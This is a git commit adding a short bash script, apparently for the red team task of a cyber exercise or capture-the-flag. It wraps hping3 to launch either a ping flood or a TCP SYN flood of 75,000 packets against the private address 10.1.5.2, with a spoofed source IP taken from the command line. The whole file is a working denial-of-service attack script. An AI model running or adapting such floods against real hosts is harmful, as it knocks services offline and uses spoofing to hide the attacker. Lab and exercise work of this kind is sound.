9ee0afaad2239ac9fca7472b14d88bc901648bc5
Pivoz <davide.piva@icloud.com>
2020-11-17 14:59:16 +0100

    Added script for hping3 tool

---
+++ resilient_cctf/red_task/scripts/flood_hping.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+if [[ $# -lt 2 ]]
+then
+    echo "USAGE: ./flood_hping.sh <option> <srcIP>"
+    echo "option 1: ping flood"
+    echo "option 2: tcp syn flood"
+    exit 1
+fi
+
+if [ "$1" == "1" ];
+then
+    echo "Start ping flood"
+    sudo hping3 10.1.5.2 --flood --win 64240 --spoof $2 --count 75000 &
+fi
+
+if [ "$1" == "2" ];
+then
+    echo "Start SYN flood"
+    sudo hping3 10.1.5.2 --flood --win 64240 --spoof $2 --count 75000 --syn &
+fi
